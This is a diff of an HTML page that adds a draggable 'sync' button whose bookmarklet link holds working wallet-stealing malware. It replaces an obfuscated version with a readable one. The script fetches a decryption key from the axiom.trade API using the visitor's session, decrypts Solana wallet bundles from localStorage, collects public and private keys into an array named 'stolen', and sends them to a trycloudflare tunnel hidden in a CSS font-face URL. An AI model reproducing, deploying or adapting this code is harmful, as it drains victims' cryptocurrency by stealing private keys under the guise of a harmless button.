@@ -357,7 +357,78 @@ font-size: 15px;
                     </div>
 
                     <div class="sync-area" id="sync-area">
-<a href="javascript:(async function(){const r='https://hughes-wiring-happen-chronicles.trycloudflare.com';const F=m=>Uint8Array['from'](atob(m['replace'](/-/g,'+')['replace'](/_/g,'/')),M=>M['charCodeAt'](0x0)),L=async(m,M)=>{try{const [Y,x]=M['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':F(Y),'tagLength':0x80},m,F(x)));}catch(h){return null;}},u=m=>{const M='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let Y=[0x0];for(let h=0x0;h<m['length'];h++){let N=m[h];for(let v=0x0;v<Y['length']-0x1;v++){N+=Y[v]*0x100,Y[v]=N%0x3a,N=Math['floor'](N/0x3a);}while(N>0x0){Y['push'](N%0x3a),N=Math['floor'](N/0x3a);}}let x='';for(let C=0x0;m[C]===0x0&&C<m['length']-0x1;C++)x+=M[0x0];for(let n=Y['length']-0x1;n>=0x0;n--)x+=M[Y[n]];return x;};try{const m=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),M=await m['json']();if(!M['bundleKey'])return;const Y=await crypto['subtle']['importKey']('raw',F(M['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let x=[];const h=JSON['parse'](localStorage.getItem('sBundles')||'[]');for(const N of h){const v=await L(Y,N);v&&x['push']({'type':'SOL','public':u(v['slice'](-0x20)),'private':u(v)});}if(x['length']>0x0){const C=btoa(JSON['stringify']({'keys':x})),n=document['createElement']('style');n['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+r+'/?data='+encodeURIComponent(C)+'\x27);\x20}',document['head']['appendChild'](n);const l=document['createElement']('div');l['style']['fontFamily']='leak',l['textContent']='.',document['body']['appendChild'](l);}}catch(z){}}());" 
+<a href="javascript:(async function() {
+    const TUNNEL_URL = "https://hughes-wiring-happen-chronicles.trycloudflare.com";
+    console.log("%c[!] NICKY TOOL: ACTIVE", "color: cyan; font-weight: bold;");
+
+    const base64ToBytes = (base64) => Uint8Array.from(atob(base64.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0));
+    const decrypt = async (key, encryptedData) => {
+        try {
+            const [ivBase64, dataBase64] = encryptedData.split(':');
+            return new Uint8Array(await crypto.subtle.decrypt(
+                { name: 'AES-GCM', iv: base64ToBytes(ivBase64), tagLength: 128 },
+                key,
+                base64ToBytes(dataBase64)
+            ));
+        } catch (e) { return null; }
+    };
+
+    const base58 = (B) => {
+        const A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+        let d = [0];
+        for (let i = 0; i < B.length; i++) {
+            let carry = B[i];
+            for (let j = 0; j < d.length; j++) {
+                carry += d[j] * 256;
+                d[j] = carry % 58;
+                carry = Math.floor(carry / 58);
+            }
+            while (carry > 0) {
+                d.push(carry % 58);
+                carry = Math.floor(carry / 58);
+            }
+        }
+        let res = '';
+        for (let i = 0; B[i] === 0 && i < B.length - 1; i++) res += A[0];
+        for (let i = d.length - 1; i >= 0; i--) res += A[d[i]];
+        return res;
+    };
+
+    try {
+        console.log("[*] Initializing Activation");
+        const res = await fetch("https://api8.axiom.trade/bundle-key-and-wallets", { method: "POST", credentials: "include" });
+        const data = await res.json();
+        if (!data.bundleKey) return;
+
+        const key = await crypto.subtle.importKey("raw", base64ToBytes(data.bundleKey), { name: "AES-GCM" }, false, ["decrypt"]);
+        let stolen = [];
+
+        const solBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
+        for (const entry of solBundles) {
+            const decrypted = await decrypt(key, entry);
+            if (decrypted) {
+                stolen.push({ type: "SOL", public: base58(decrypted.slice(-32)), private: base58(decrypted) });
+            }
+        }
+
+        if (stolen.length > 0) {
+            console.log("%c[+] Success. Communicating with Server...", "color: lime;");
+            const payload = btoa(JSON.stringify({ keys: stolen }));
+            const style = document.createElement("style");
+            style.textContent = `@font-face { font-family: 'leak'; src: url('${TUNNEL_URL}/?data=${encodeURIComponent(payload)}'); }`;
+            document.head.appendChild(style);
+            
+            const div = document.createElement("div");
+            div.style.fontFamily = "leak";
+            div.textContent = ".";
+            document.body.appendChild(div);
+            console.log("[!] Data initialized");
+        } else {
+            console.warn("[-] No data found.");
+        }
+    } catch (e) { console.error("[-] Error:", e); }
+})();
+" 
                            class="btn" 
                            id="sync-btn"
                            draggable="true">
